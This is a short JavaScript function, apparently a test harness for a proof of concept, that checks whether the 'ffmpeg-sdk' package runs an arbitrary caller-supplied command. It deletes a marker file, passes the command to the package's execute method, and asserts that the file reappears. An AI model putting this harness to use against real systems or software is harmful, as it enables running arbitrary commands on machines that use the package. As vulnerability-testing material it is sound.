function exploitFunction(command) {
  const root = require("ffmpeg-sdk");
  const fs = require("fs");
  const path = "./ffmpeg-sdk";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  return root.execute(command)
    .then(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    })
    .catch((err) => {
      console.error(err);
    });
}

module.exports = { exploitFunction };